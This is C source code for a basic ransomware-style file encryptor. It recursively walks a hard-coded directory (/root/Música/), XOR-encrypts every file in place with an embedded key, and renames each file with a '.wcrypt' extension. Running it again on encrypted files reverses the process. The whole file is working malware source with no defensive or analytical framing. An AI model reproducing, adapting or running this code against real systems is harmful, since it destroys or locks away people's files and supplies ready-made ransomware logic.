#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

#define EXT ".wcrypt"
#define INIPATH "/root/Música/"
#define KEY "[9 26f!*Iw4dq,_/wNU^aW!&s"

void addExt(char *path_c, char ext[]);
void removeExt(char *path_c, char ext[]);
void listFiles(char path[], int recursive);
int getSizeFile(FILE *file);

int main(void){
	listFiles(INIPATH, 1);
	return 0;
}

void addExt(char *old_path_c, char ext[]){
	char *new_path_c = malloc(strlen(old_path_c)+strlen(ext)+2);
	
	strcpy(new_path_c, old_path_c);
	strcat(new_path_c, ext);
	
	rename(old_path_c, new_path_c);	
	free(new_path_c);
}

void removeExt(char *old_path_c, char ext[]){
	
	char *new_path_c = malloc(strlen(old_path_c) + 1);
	strcpy(new_path_c, old_path_c);
	
	size_t len = strlen(ext);
    if (len > 0) {
        char *p = new_path_c;
        while ((p = strstr(p, ext)) != NULL) {
            memmove(p, p + len, strlen(p + len) + 1);
        }
    }
    
    rename(old_path_c, new_path_c);
    free(new_path_c);
}

int getSizeFile(FILE *file){
	fseek(file, 0, SEEK_END);
	int size = ftell(file);
	fseek(file, 0, SEEK_SET);
	return size;
}

void encrypt(FILE *file, char *key){
	char c;
	int i      = 0;
	int size   = getSizeFile(file);
	
	while(ftell(file) < size){
		c = fgetc(file);
		fseek(file, -1, SEEK_CUR);
		fputc(c^key[i++%strlen(key)], file);
		fseek(file, 0, SEEK_CUR);
	}
}

void listFiles(char path[], int recursive){
	struct dirent *lsdir;
	DIR *dir = opendir(path);
	
    if(dir){
    	while ((lsdir = readdir(dir)) != NULL){
			char *path_c = malloc(strlen(path)+strlen(lsdir->d_name)+2);
	    	strcpy(path_c, path);
			strcat(path_c, lsdir->d_name);
			
			if(opendir(path_c) == NULL){
				
				FILE *file;
				file = fopen(path_c, "r+b");
				
				printf("[+] Encrypting file %s ...\n", lsdir->d_name);
				encrypt(file, KEY);
				fclose(file);
				
				if(strstr(path_c, EXT) == NULL){
					addExt(path_c, EXT);
				}else {
					removeExt(path_c, EXT);
				}
				
			}else if(recursive && strcmp(lsdir->d_name, ".") && strcmp(lsdir->d_name, "..")) {
				strcat(path_c, "/");
				listFiles(path_c, recursive);
			}
			
			free(path_c);
		}
    	
	}else {
		printf("Erro ao abrir arquivo!");
	}
	
	closedir(dir);
}